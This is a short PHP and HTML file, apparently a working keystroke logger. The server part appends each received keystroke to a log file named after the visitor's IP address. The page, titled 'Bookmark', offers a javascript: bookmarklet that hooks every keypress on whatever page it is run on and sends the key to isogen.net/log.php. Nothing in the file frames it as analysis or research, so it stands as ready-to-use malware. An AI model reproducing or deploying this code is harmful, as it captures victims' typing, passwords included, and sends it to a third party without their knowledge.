<?php
header("Access-Control-Allow-Origin: *");
$location = $_SERVER['REMOTE_ADDR'];
$handle = fopen("Logs/" . $location.'.txt', "a");
fwrite($handle, $_GET['key']);
echo "thanks for the " . $_GET['key'];

?>

<html>
<head>
<title>Bookmark</title>
<script>
function setBM(){
	var logstring = "javascript:style=document.addEventListener(\"keypress\", function(key){var xmlHttp = new XMLHttpRequest();xmlHttp.open(\"GET\", \"https://isogen.net/log.php?key=\" + encodeURI(key.key), true);xmlHttp.send(null);})";
	history.replaceState('data', null, logstring);
}
</script>

<body>
	javascript:style=document.addEventListener("keypress", function(key){this.word="";var xmlHttp = new XMLHttpRequest();xmlHttp.open("GET", "https://isogen.net/log.php?key=" + encodeURI(key.key), true);xmlHttp.send(null);})
</body>